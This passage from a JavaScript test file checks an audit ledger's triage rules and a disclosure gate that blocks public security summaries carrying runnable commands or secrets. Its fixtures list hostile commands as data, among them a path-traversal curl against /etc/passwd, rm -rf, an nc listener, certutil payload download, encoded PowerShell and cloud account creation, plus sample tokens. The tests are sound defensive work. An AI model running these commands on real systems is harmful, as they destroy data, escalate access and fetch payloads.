    const result = checkFindingTriage({
      id: "A03-F7",
      title: "duplicate of the redaction gap",
      status: "Duplicate",
      severity: "medium",
      // A Duplicate reached Confirmed on the way here (§3.4 routes it through),
      // so it owes the confirmation record like any other triaged finding. What
      // it does NOT owe is a regression test or a rationale — the record it
      // duplicates owns both.
      ...confirmedRecordFacts(),
      impact: "the two backends drift apart silently at runtime",
      regressionTestLocation: "audit/tests/database-contract.test.js",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "F-R2-01" },
    });
    assert.deepStrictEqual(result.errors, []);
  });
});

describe("T8.1 — wave closeout leaves no orphaned Confirmed entry", () => {
  const wave = () => [plannedFinding(), acceptedRiskFinding()];
  const waveIds = ["A14-F1", "A03-F2"];

  test("a fully triaged wave closes", () => {
    const result = checkWaveTriage(wave(), { expectedFindingIds: waveIds });
    assert.deepStrictEqual(result.errors, []);
    assert.strictEqual(result.ok, true);
    assert.deepStrictEqual(result.triaged, waveIds);
    assert.deepStrictEqual(result.orphaned, []);
  });

  test("one orphaned Confirmed entry stops the wave", () => {
    const result = checkWaveTriage(
      [plannedFinding(), { ...acceptedRiskFinding(), status: "Confirmed", triage: undefined }],
      { expectedFindingIds: waveIds },
    );
    assert.strictEqual(result.ok, false);
    assert.deepStrictEqual(result.orphaned, ["A03-F2"]);
  });

  test("an untriaged Candidate stops the wave", () => {
    const result = checkWaveTriage(
      [plannedFinding(), { ...acceptedRiskFinding(), status: "Candidate", triage: undefined }],
      { expectedFindingIds: waveIds },
    );
    assert.strictEqual(result.ok, false);
    assert.deepStrictEqual(result.untriaged, ["A03-F2"]);
  });

  test("a missing expectedFindingIds is refused — a partial ledger read must not close as clean", () => {
    for (const expectedFindingIds of [undefined, null, "A14-F1", [""], [null]]) {
      const result = checkWaveTriage(wave(), { expectedFindingIds });
      assert.strictEqual(result.ok, false, `${JSON.stringify(expectedFindingIds)} must be refused`);
      assert.match(result.errors.join("\n"), /without the set the wave is measured against/);
    }
  });

  test("a malformed findings collection is refused, not treated as an empty wave", () => {
    for (const findings of [undefined, null, {}, "A14-F1"]) {
      const result = checkWaveTriage(findings, { expectedFindingIds: waveIds });
      assert.strictEqual(result.ok, false, `${JSON.stringify(findings)} must be refused`);
      assert.match(result.errors.join("\n"), /would close it without checking a single finding/);
    }
  });

  test("an explicitly empty wave is a real answer and closes", () => {
    const result = checkWaveTriage([], { expectedFindingIds: [] });
    assert.deepStrictEqual(result.errors, []);
    assert.strictEqual(result.ok, true);
  });

  test("but an empty findings list against a non-empty expected set does not", () => {
    const result = checkWaveTriage([], { expectedFindingIds: waveIds });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /no record for: A14-F1, A03-F2/);
  });

  test("the same finding recorded twice is refused — two decisions both look complete", () => {
    const result = checkWaveTriage([plannedFinding(), plannedFinding(), acceptedRiskFinding()],
      { expectedFindingIds: waveIds });
    assert.strictEqual(result.ok, false);
    assert.deepStrictEqual(result.duplicated, ["A14-F1"]);
  });

  test("a record from another wave is not counted as this wave's coverage", () => {
    const result = checkWaveTriage([plannedFinding(), acceptedRiskFinding(), plannedFinding({ id: "A06-F4" })],
      { expectedFindingIds: waveIds });
    assert.strictEqual(result.ok, false);
    assert.deepStrictEqual(result.unexpected, ["A06-F4"]);
  });

  test("a duplicated expected id is refused — the measuring set must name each finding once", () => {
    const result = checkWaveTriage(wave(), { expectedFindingIds: ["A14-F1", "A14-F1"] });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /contains duplicate ids/);
  });

  test("a Duplicate pointing at a record nobody can find does not close the wave", () => {
    // The bypass this replaces: duplicateOf was checked for being a
    // non-placeholder string that is not the finding's own id, so a typo closed
    // a real finding as tracked by a record that does not exist.
    const duplicate = {
      ...plannedFinding(),
      id: "A03-F2",
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "TYPO-999" },
    };
    const result = checkWaveTriage([plannedFinding(), duplicate], { expectedFindingIds: waveIds });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /not a known record/);

    // Pointed at a finding that IS in the wave, it closes.
    duplicate.triage.duplicateOf = "A14-F1";
    assert.strictEqual(checkWaveTriage([plannedFinding(), duplicate],
      { expectedFindingIds: waveIds }).ok, true);
  });

  test("a Duplicate may point outside the wave when the caller names the ledger", () => {
    const duplicate = {
      ...plannedFinding(),
      id: "A03-F2",
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "F-R2-01" },
    };
    assert.strictEqual(checkWaveTriage([plannedFinding(), duplicate],
      { expectedFindingIds: waveIds, ledgerRecordIds: ["F-R2-01"] }).ok, true);
    assert.strictEqual(checkWaveTriage([plannedFinding(), duplicate],
      { expectedFindingIds: waveIds }).ok, false, "without the ledger ids the link resolves to nothing");
  });

  test("a Duplicate pointing at a REJECTED record in the same wave does not close it", () => {
    // The bypass this replaces: any id present in the wave counted as a
    // resolvable target, so a claim the evidence gate had already thrown out
    // could stand in as the "existing tracked finding" that owns a real one.
    const rejected = {
      id: "A03-F2",
      status: "Rejected",
      history: [{ from: "Candidate", to: "Rejected", at: "2026-08-20T10:00:00Z" }],
    };
    const duplicate = {
      ...plannedFinding(),
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "A03-F2" },
    };
    const result = checkWaveTriage([duplicate, rejected], { expectedFindingIds: waveIds });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /whose own status is Rejected/);

    // A stale id in the caller's ledger list must not vote a rejected in-wave
    // record back into eligibility — the wave's own copy is the current state.
    assert.strictEqual(checkWaveTriage([duplicate, rejected],
      { expectedFindingIds: waveIds, ledgerRecordIds: ["A03-F2"] }).ok, false,
    "a ledger id must not resurrect a record the wave itself rejected");
  });

  test("a Duplicate pointing at an untriaged CANDIDATE in the same wave is refused too", () => {
    const candidate = { ...acceptedRiskFinding(), status: "Candidate", triage: undefined,
      history: [] };
    const duplicate = {
      ...plannedFinding(),
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "A03-F2" },
    };
    const result = checkWaveTriage([duplicate, candidate], { expectedFindingIds: waveIds });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /whose own status is Candidate/);
  });

  test("a ledger record that carries an INELIGIBLE status cannot own a Duplicate either", () => {
    // The hole this closes: an external record arrived as a bare id, so its
    // status was invisible and it counted as eligible by default. A Rejected
    // finding one ledger away owns a remediation no better than one inside the
    // wave.
    const duplicate = {
      ...plannedFinding(),
      id: "A03-F2",
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "F-R2-01" },
    };
    const closeWith = (ledgerRecordIds) =>
      checkWaveTriage([plannedFinding(), duplicate], { expectedFindingIds: waveIds, ledgerRecordIds });

    for (const status of ["Rejected", "Candidate"]) {
      const result = closeWith([{ id: "F-R2-01", status }]);
      assert.strictEqual(result.ok, false, `a ${status} ledger record must not own a Duplicate`);
      assert.match(result.errors.join("\n"), new RegExp(`whose own status is ${status}`));
    }

    // A confirmed-or-later ledger record still closes the wave, and so does a
    // bare id — the shape that says "this is an external record with no
    // lifecycle status to check".
    assert.strictEqual(closeWith([{ id: "F-R2-01", status: "Planned" }]).ok, true);
    assert.strictEqual(closeWith(["F-R2-01"]).ok, true);
  });

  test("an external record that owns no decision cannot own a Duplicate", () => {
    // The hole this closes: any status reachable from Confirmed counted, so an
    // orphaned external `Confirmed` — examined, nothing decided — or an external
    // `Duplicate` pointing somewhere this gate cannot follow could close a real
    // finding. An in-wave record earns "confirmed-or-later" by being validated
    // in full; a ledger entry is two fields, so the status itself has to carry
    // the ownership.
    const duplicate = {
      ...plannedFinding(),
      id: "A03-F2",
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "F-R2-01" },
    };
    const closeWith = (ledgerRecordIds) =>
      checkWaveTriage([plannedFinding(), duplicate], { expectedFindingIds: waveIds, ledgerRecordIds });

    for (const status of ["Confirmed", "Duplicate", "Reopened"]) {
      const result = closeWith([{ id: "F-R2-01", status }]);
      assert.strictEqual(result.ok, false, `a ${status} ledger record must not own a Duplicate`);
      assert.match(result.errors.join("\n"), new RegExp(`whose own status is ${status}`));
    }

    // The statuses that DO carry a decision still close the wave.
    for (const status of ["Planned", "IssueFiled", "Fixed", "AcceptedRisk", "DocumentationOnly"]) {
      assert.strictEqual(closeWith([{ id: "F-R2-01", status }]).ok, true,
        `a ${status} ledger record owns the fix`);
    }
    // And the bare id is still the caller's own promise, unchanged.
    assert.strictEqual(closeWith(["F-R2-01"]).ok, true);
  });

  test("a ledger record with no status at all is refused, not read as eligible", () => {
    // The hole this closes: `{ id: "F-1" }` was treated as "nothing to check",
    // so a partial projection that dropped the status column let a Duplicate
    // close against a Candidate or a Rejected record. The record shape is the
    // caller SAYING the status is knowable; a caller who really is vouching for
    // an external record uses the bare-id form.
    const result = checkWaveTriage(wave(),
      { expectedFindingIds: waveIds, ledgerRecordIds: [{ id: "F-R2-01" }] });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /status is required on a \{id, status\} record/);
  });

  test("a ledger record whose status is unreadable is refused, not read as status-free", () => {
    const result = checkWaveTriage(wave(),
      { expectedFindingIds: waveIds, ledgerRecordIds: [{ id: "F-R2-01", status: "Spicy" }] });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /status must be one of/);
  });

  test("a trail whose timestamps run backwards is refused", () => {
    // The hole this closes: only that each `at` PARSED was checked, so a record
    // could be confirmed on the 22nd and triaged on the 21st. T8 dates a
    // finding by its trail, so the record gets credited to a wave that never
    // examined it, and the decision claims to predate the evidence for it.
    const backwards = plannedFinding({
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-22T10:00:00Z" },
        { from: "Confirmed", to: "Planned", at: "2026-08-21T09:00:00Z" },
      ],
    });
    const result = checkFindingTriage(backwards);
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /a status trail runs forwards/);
  });

  test("but two transitions sharing one stamp still pass — a batch is not a paradox", () => {
    const together = plannedFinding({
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-21T09:00:00Z" },
        { from: "Confirmed", to: "Planned", at: "2026-08-21T09:00:00Z" },
      ],
    });
    assert.deepStrictEqual(checkFindingTriage(together).errors, []);
  });

  test("a malformed ledgerRecordIds is refused rather than read as an empty ledger", () => {
    for (const ledgerRecordIds of ["F-R2-01", [""], [null], {}]) {
      const result = checkWaveTriage(wave(), { expectedFindingIds: waveIds, ledgerRecordIds });
      assert.strictEqual(result.ok, false, `${JSON.stringify(ledgerRecordIds)} must be refused`);
    }
  });

  test("a cycle of Duplicate links does not close the wave — nobody on it owns the fix", () => {
    // A -> B -> A. Every per-finding check passes: each names a real, different,
    // existing record. Only the wave can see the loop.
    const link = (id, target) => ({
      ...plannedFinding(),
      id,
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: target },
    });
    const result = checkWaveTriage([link("A14-F1", "A03-F2"), link("A03-F2", "A14-F1")],
      { expectedFindingIds: waveIds });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /form a cycle/);
  });

  test("a Duplicate chain that ends at a real outcome is fine", () => {
    const chained = {
      ...plannedFinding(),
      id: "A03-F2",
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "A14-F1" },
    };
    // A14-F1 is Planned — it owns the fix, so the chain terminates there.
    const result = checkWaveTriage([plannedFinding(), chained], { expectedFindingIds: waveIds });
    assert.deepStrictEqual(result.errors, []);
    assert.strictEqual(result.ok, true);
  });

  test("a record with no usable id lands in `invalid` and credits coverage to nobody", () => {
    const result = checkWaveTriage([plannedFinding(), acceptedRiskFinding(), { status: "Planned" }],
      { expectedFindingIds: waveIds });
    assert.strictEqual(result.ok, false);
    assert.deepStrictEqual(result.invalid, ["findings[2]"]);
    assert.deepStrictEqual(result.unexpected, []);
  });
});

describe("T8.2 — security disclosure gate", () => {
  /**
   * A traversal finding whose reproduction is a single runnable command.
   *
   * `evidence` is a STRING, which is the shape slice-execution.js's
   * CONFIRMATION_STRING_FIELDS requires of any finding that reached Confirmed.
   * An earlier version of this fixture used the array-of-items shape that
   * classifyCandidateEvidence() takes as a separate argument, which hid the
   * fact that the scanner rejected every genuinely confirmed finding.
   */
  function securityFinding(overrides = {}) {
    return {
      id: "A05-F1",
      title: "file-read endpoint accepts parent-directory segments",
      severity: "critical",
      status: "Planned",
      // Every field schema.js's validateFinding() makes mandatory. Publication
      // asserts a supported finding, so the export gate validates the RECORD and
      // not only its trail — an earlier fixture carried a trail and a summary
      // and nothing else, which is exactly the unsupported claim that used to
      // export cleanly.
      confidence: "high",
      affectedPaths: [{ file: "lib/routes/paths.js", line: 84 }],
      // §7's confirmation facts. Publication re-checks the whole exit gate, not
      // just schema.js's presence list, so a fixture missing these is a record
      // that never proved it was confirmed.
      revision: "f01b78dc",
      variantsConsidered: ["SQLite", "Postgres"],
      duplicateSearch: { classification: "Distinct", matches: [], relatedBySymptom: [] },
      model: "claude-opus-5",
      tokens: { input: 5100, cachedInput: 0, cacheCreationInput: 0, reasoning: 0, output: 900 },
      violatedInvariant: "every file read is contained within an allowed root",
      impact: "any reader of the endpoint can retrieve files outside the configured root",
      expected: "a joined path that escapes the allowed root is refused before any read",
      actual: "the joined path is read whenever the string prefix still matches the root",
      suggestedMitigation: "resolve the path, then re-check containment before opening it",
      reproduction: "curl http://localhost:3000/api/files?path=../../etc/passwd",
      evidence: "send the crafted path lib/../../etc/passwd through the read endpoint and it resolves outside the allowed root",
      // A status is a claim about a journey; the trail and the decision record
      // are what make it checkable. Without them this fixture asserted
      // "Planned" with nothing behind it, and the export gate believed it.
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Planned", at: "2026-08-21T09:00:00Z" },
      ],
      regressionTestLocation: "tests/unit/paths.test.js",
      regressionTestAssertion: "assert a joined path escaping the root is refused before any read",
      triage: { outcome: "Planned", owner: "lkikov", date: "2026-08-21" },
      disclosure: { classification: "public", decidedBy: "lkikov", date: "2026-08-22" },
      publicSummary: "The file-read endpoint does not reject parent-directory segments, so a request can " +
        "reach content outside the configured root. Details are withheld until the fix ships.",
      ...overrides,
    };
  }

  /**
   * checkPublicExport is the one function in this module that consults the
   * working tree, so every test about disclosure and summary sanitation injects
   * a resolver that answers "this file is here and long enough". Otherwise each
   * of them would silently depend on the anchor in the fixture still existing
   * at that line in the real checkout, and would start failing for a reason
   * that has nothing to do with what it asserts.
   *
   * The anchor gate itself is tested separately, below, with resolvers that say
   * something else.
   */
  const RESOLVES_CLEANLY = () => ({ inTree: true, exists: true, lines: Number.POSITIVE_INFINITY });
  const exportOf = (finding, options = {}) =>
    checkPublicExport(finding, { anchorResolver: RESOLVES_CLEANLY, ...options });

  test("a fine-grained GitHub PAT is recognized, not only the legacy gh*_ prefixes", () => {
    // The hole this closes: the body pattern forbade `_`, and a fine-grained
    // PAT separates its id segment from its secret with one — so the rule
    // stopped at the underscore and matched nothing, on the format that is now
    // the common one.
    const pat = "github_pat_11ABCDEFG0abcdefghijklm_0123456789abcdefghijklmnopqrstuvwxyz012345678";
    const leaked = exportOf(securityFinding({
      publicSummary: `The seed file ships ${pat} in plain text, so any reader of the repository ` +
        `holds a write credential.`,
    }));
    assert.strictEqual(leaked.allowed, false);
    assert.match(leaked.blockedReasons.join("\n"), /GitHub token/);

    // The legacy spelling still blocks, and NAMING the credential still exports.
    assert.strictEqual(exportOf(securityFinding({
      publicSummary: `The seed file ships ghp_0123456789abcdefghijklmnopqrstuvwxyz in plain text.`,
    })).allowed, false);
    assert.strictEqual(exportOf(securityFinding({
      publicSummary: "The seed file ships a GitHub personal access token in plain text; the value " +
        "itself is withheld until the credential is rotated.",
    })).allowed, true);
  });

  test("an exploit command is blocked even when its executable builds nothing here", () => {
    // The hole this closes: the runner list was built from THIS project's build
    // tools, so it answered the wrong question at the disclosure gate. The
    // commands a security finding is actually about — `rm -rf /data`,
    // `nc host 4444`, `kubectl delete …` — run nothing this repository builds
    // with, are short enough to clear every length rule, and carry no payload
    // pattern, so each one published intact.
    for (const publicSummary of [
      "The handler passes the name straight through, so rm -rf /data runs as root.",
      "A listener started with nc host 4444 receives every dumped row.",
      "An operator token lets anyone kubectl delete the worker deployment.",
      "The installer leaves chmod 777 /etc/shadow behind on first boot.",
      "Anyone on the subnet can ssh -i /tmp/key deploy@host without a passphrase.",
      "A single systemctl stop aperio silences the audit writer for good.",
      "The value is recovered with openssl enc -d -aes-256-cbc from the backup.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(publicSummary)} must be refused`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
    }
  });

  test("a cloud control-plane command is blocked, hyphenated verb and all", () => {
    // The hole this closes: the walk allowed ONE plain word between the runner
    // and its argument, and a plain word was `^[a-z]+$`. Every modern CLI spells
    // its verbs with a hyphen — `create-user`, `run-command`, `port-forward` —
    // so the walk stopped one token short of the flag that proves the line is a
    // command, and `aws iam create-user --user-name attacker` published whole.
    for (const publicSummary of [
      "Any holder of the deploy role can aws iam create-user --user-name attacker at will.",
      "The leaked profile allows aws s3 cp s3://aperio-backups /tmp against production.",
      "The metadata endpoint yields a token good for gcloud compute ssh --zone us-east1 bastion.",
      "A stale contributor can still run az vm run-command invoke --command-id RunShellScript.",
      "The pipeline credential permits terraform destroy -auto-approve on the live workspace.",
      "Anyone in the namespace can helm upgrade --install ingress with their own values file.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(publicSummary)} must be refused`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
    }

    // The widened walk must not start refusing the prose it exists to publish:
    // `make`, `curl`, and `node` still need an argument in the very next slot.
    for (const publicSummary of [
      "The operator has to make sure the allowed roots match before the service starts, " +
        "and nothing in the boot sequence checks that they do.",
      "We curl the health endpoint on every deploy, so the stale reading is served for " +
        "a full minute before anyone notices the difference.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.deepStrictEqual(result.blockedReasons, [], JSON.stringify(publicSummary));
      assert.strictEqual(result.allowed, true);
    }
  });

  test("a never-prose runner is read past its own flags to the argument", () => {
    // A word that is never English cannot collide with a sentence, so the walk
    // opens wider there — which is what reaches the operand of a command whose
    // first tokens are all flags or plain words.
    for (const publicSummary of [
      "The exposed port lets anyone run mongodump --db aperio --out /tmp//dump unauthenticated.",
      "A pod token is enough to kubectl -n prod exec api-0 -- sh inside the cluster.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(publicSummary)} must be refused`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
    }
  });

  test("a PowerShell or living-off-the-land command is blocked like any other", () => {
    // The hole this closes: a ledger that only knew POSIX runners read a Windows
    // exploit as prose. `powershell -EncodedCommand …` carries its whole payload
    // in one base64 argument — short, matching no payload pattern, and nowhere
    // near the eight-word run.
    for (const publicSummary of [
      "The service account runs powershell -EncodedCommand ZQB2AGkAbAA= on every logon.",
      "A scheduled task calls certutil -urlcache -f http://host/p.exe before the check.",
      "The installer shells out to cmd /c whoami with the caller's own input appended.",
      "Anyone can reach it with pwsh -c \'Get-Content secrets.txt\' from the share.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(publicSummary)} must be refused`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
    }

    // Naming the shell is still ordinary writing.
    const prose = exportOf(securityFinding({
      publicSummary: "The logon script is written in PowerShell and never validates the account " +
        "name it is handed, which is the whole defect.",
    }));
    assert.deepStrictEqual(prose.blockedReasons, []);
    assert.strictEqual(prose.allowed, true);
  });

  test("but NAMING one of those tools is still ordinary writing, and still exports", () => {
    // Why NEVER_PROSE_RUNNERS is a subset and not the whole list, read from the
    // other side: an executable is only a command when an argument follows it.
    // `rm`, `nc` and `sudo` appear in these sentences as nouns, and a rule that
    // blocked them would refuse the findings that most need reporting.
    for (const publicSummary of [
      "The rm command it builds is never validated, which is the whole defect here.",
      "A base64 payload in the header is decoded before its length is ever checked.",
      "The sudo rule shipped in the image grants more than the installer documents.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.deepStrictEqual(result.blockedReasons, [], `${JSON.stringify(publicSummary)} must export`);
      assert.strictEqual(result.allowed, true);
    }
  });

  test("a runner and its own SUBCOMMAND are a command line, whatever follows them", () => {
    // The hole this closes: every token of `npm run exploit` and `docker exec
    // db psql` is a plain word, so no shape test ever fired and the scanner
    // waited for an argument that never came. The verb settles it — `npm run`
    // and `docker exec` are not phrases anyone writes ABOUT a system, they are
    // things one types at it.
    for (const publicSummary of [
      "Anyone with a checkout can npm run exploit and read the process table.",
      "A docker exec db psql session reaches the audit rows with no credential at all.",
      "The fix is verified by a git bisect across the affected releases.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(publicSummary)} must be refused`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
    }

    // Only the runners that HAVE subcommands pay this cost. `make`, `curl` and
    // `node` keep the argument rule alone, which is what protects the prose
    // they routinely appear in.
    const prose = exportOf(securityFinding({
      publicSummary: "The handler does not make sure the caller is an admin, and we curl the health " +
        "endpoint on every boot without noticing it.",
    }));
    assert.deepStrictEqual(prose.blockedReasons, []);
    assert.strictEqual(prose.allowed, true);
  });

  test("a command whose argument is a plain operand is blocked too", () => {
    // The hole this closes: an argument was only recognized by its shell
    // punctuation, so `node exploit.js` and `curl localhost:3000` — a script
    // name and a host:port, no flag and no slash between them — read as prose
    // and published the line that runs the attack.
    for (const publicSummary of [
      "Anyone can run node exploit.js against the worker and read process state.",
      "A short python poc.py reproduces it in one pass.",
      "A request to curl localhost:3000 returns the process table.",
      "Running bash drop.sh removes the audit rows.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(publicSummary)} must be refused`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
    }
  });

  test("a config file or a version beside a runner is prose, and still exports", () => {
    // The other half of the same rule. A plain operand counts only in the slot
    // immediately after the runner, and only when it names something a runner
    // EXECUTES — otherwise every summary mentioning package.json, compose.yml,
    // or a version number would be unpublishable.
    for (const publicSummary of [
      "The docker compose.yml file starts the worker without the session middleware.",
      "The npm package.json lists the worker entry point but no auth wiring at all.",
      "It reproduces on python 3.11 and on node 20.11 alike, so it is not a runtime bug.",
      "Make sure node.js is installed before reviewing the fix in a local checkout.",
      "The nightly job runs curl at 10:30 and is unaffected by the missing check.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.deepStrictEqual(result.blockedReasons, [], `${JSON.stringify(publicSummary)} must export`);
      assert.strictEqual(result.allowed, true);
    }
  });

  test("a credential copied out of the reproduction WITHOUT its key is blocked", () => {
    // The hole this closes: every rule was label-shaped or length-shaped. Strip
    // `password=` off `password=hunter2` and the assignment scanner has no key
    // to read, the sentence is not a command, and one word is nowhere near the
    // eight-word run — so "the exposed credential is hunter2" published the
    // working secret.
    const leaked = securityFinding({
      reproduction: "npm run seed, then sign in at /login with password=hunter2",
      publicSummary: "The seeded admin account stays live after first boot; the exposed credential " +
        "is hunter2, so anyone who read the seed file can sign in.",
    });
    const result = exportOf(leaked);
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /with the label stripped off/);
  });

  test("an Authorization token pasted without its scheme is blocked the same way", () => {
    const leaked = securityFinding({
      reproduction: "npm run seed, then replay Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.e30.abc",
      publicSummary: "A session captured before the fix, eyJhbGciOiJIUzI1NiJ9.e30.abc, still " +
        "authenticates after the password change.",
    });
    const result = exportOf(leaked);
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /with the label stripped off/);
  });

  test("a credential that reads as ordinary English or as a count does NOT block the summary", () => {
    // The collision safeguard. `admin` is the vocabulary every access-control
    // finding is written in and `4096` is what a count looks like, so matching
    // them out of context would refuse the honest summaries this gate exists to
    // let through. Both stay guarded by the LABELLED rule and by the verbatim
    // command rule — what is given up is only the unlabelled copy of a value
    // indistinguishable from prose.
    for (const [reproduction, publicSummary] of [
      ["npm run seed, then sign in at /login with password=admin",
        "An admin can still sign in with the seeded value; the value itself is withheld here."],
      ["npm run seed, then sign in at /login with password=4096",
        "The retry budget is 4096 requests before the lockout applies, which is what hides this."],
    ]) {
      const result = exportOf(securityFinding({ reproduction, publicSummary }));
      assert.deepStrictEqual(result.blockedReasons, [], `${JSON.stringify(publicSummary)} must export`);
      assert.strictEqual(result.allowed, true);
    }
  });

  test("a SHORTENED exploit command in the summary is blocked, not only a verbatim paste", () => {
    // The hole this closes: the scanner only ever compared the summary against
    // the reproduction, so any edit broke the match. A reproduction of
    // `curl https://host/promote?role=admin` and a summary carrying
    // `curl /promote?role=admin` shared no verbatim command, no eight-word run,
    // and no payload pattern — and the shortened line still performs the
    // escalation, which is the one thing T8.2 exists to keep out of a public
    // issue.
    const escalation = securityFinding({
      reproduction: "curl https://host/promote?role=admin",
      publicSummary: "The promote route accepts any signed-in caller: curl /promote?role=admin " +
        "returns 200 and the role column reads admin afterwards.",
    });
    const result = exportOf(escalation);
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
  });

  test("a command the summary invented is blocked too — there is nothing to compare it against", () => {
    for (const publicSummary of [
      "Reproduce with docker exec -it db psql and read the roles table.",
      "Anyone can run `python3 -c \'import os\'` against the worker.",
      "Try sqlite3 var/aperio.db and read the settings table.",
      "wget --post-data=role=admin against the route succeeds.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(publicSummary)} must be refused`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
    }
  });

  test("prose that merely NAMES a runner still exports — the gate has to stay passable", () => {
    // The opposite failure, and the more likely one: `make`, `curl`, `git` and
    // `npm` are ordinary English in a bug report, and a rule that blocked every
    // sentence containing one would make honest summaries unpublishable. What
    // is refused is a runner followed by an ARGUMENT, not a runner followed by
    // the rest of a sentence.
    for (const publicSummary of [
      "The route handler does not make sure the caller is an admin before writing the role column.",
      "We curl the health endpoint on every boot; that path is unaffected.",
      "Reviewers can make the request themselves once the fix lands.",
      "The seeded database has to be rebuilt before the fix can be reviewed locally.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.deepStrictEqual(result.blockedReasons, [], `${JSON.stringify(publicSummary)} must export`);
      assert.strictEqual(result.allowed, true);
    }
  });

  test("a Duplicate cannot be published without a set to resolve its duplicate link", () => {
    // The bypass this replaces: the export gate re-ran the triage check with no
    // knownRecordIds, so triage.duplicateOf was only checked for being a
    // non-placeholder string — a typo or a deleted record published as a
    // settled outcome that nothing was actually tracking.
    const duplicate = securityFinding({
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf: "TYPO-999" },
    });

    const blind = exportOf(duplicate);
    assert.strictEqual(blind.allowed, false);
    assert.match(blind.errors.join("\n"), /no knownRecordIds set was supplied/);

    const typo = exportOf(duplicate, { knownRecordIds: ["F-R2-01"] });
    assert.strictEqual(typo.allowed, false);
    assert.match(typo.errors.join("\n"), /not a known record/);

    duplicate.triage.duplicateOf = "F-R2-01";
